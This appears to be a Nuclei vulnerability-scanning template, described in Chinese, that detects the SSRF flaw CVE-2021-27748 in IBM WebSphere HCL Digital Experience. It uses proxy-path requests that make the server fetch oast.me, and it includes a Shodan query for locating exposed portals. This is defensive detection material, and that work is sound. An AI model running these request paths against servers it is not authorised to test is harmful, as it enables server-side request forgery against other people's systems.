id: ibm-websphere-ssrf

info:
  name: IBM WebSphere HCL Digital Experience - 服务端请求伪造漏洞（CVE-2021-27748）
  author: pdteam
  severity: high
  description: |
    该模板用于检测 IBM WebSphere HCL Digital Experience - 服务端请求伪造漏洞。该类漏洞通常源于服务端按用户提供的地址发起请求，但缺少目标地址校验和内网访问限制。模板会向 `/`、`/docpicker/internal_proxy/http/oast.me` 等位置发送探测请求，并结合响应状态、关键字、错误信息、时间差或外带交互等证据判断目标是否受影响。
  impact: |
    - 攻击者可借助目标服务器访问内网管理接口、云元数据地址或其他受信任网络资源。
    - 在可回显或可外带的场景下，SSRF 可能导致敏感信息泄露、凭据获取或进一步攻击内部系统。
  remediation: |
    - 对服务端请求目标使用严格白名单，禁止访问内网网段、回环地址、链路本地地址和云元数据地址。
    - 校验跳转后的最终地址，限制协议类型，并为出站请求配置最小化网络权限。
    - 监控异常内网访问和外联请求，轮换可能通过元数据接口泄露的凭据。
  reference:
    - https://blog.assetnote.io/2021/12/26/chained-ssrf-websphere/
    - https://support.hcltechsw.com/csm?id=kb_article&sysparm_article=KB0095665
    - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-27748
  classification:
    cpe: cpe:2.3:a:ibm:websphere:*:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 3
    shodan-query: http.html:"IBM WebSphere Portal"
    product: websphere
    vendor: ibm
  tags: hcl,ibm,ssrf,websphere,vuln

flow: http(1) && http(2)

http:
  - raw:
      - |
        GET / HTTP/1.1
        Host: {{Hostname}}

    host-redirects: true
    max-redirects: 2
    matchers:
      - type: word
        internal: true
        words:
          - "IBM WebSphere Portal"

  - method: GET
    path:
      - '{{BaseURL}}/docpicker/internal_proxy/http/oast.me'
      - '{{BaseURL}}/wps/PA_WCM_Authoring_UI/proxy/http/oast.me'

    host-redirects: true
    max-redirects: 2
    stop-at-first-match: true
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "Interactsh Server"
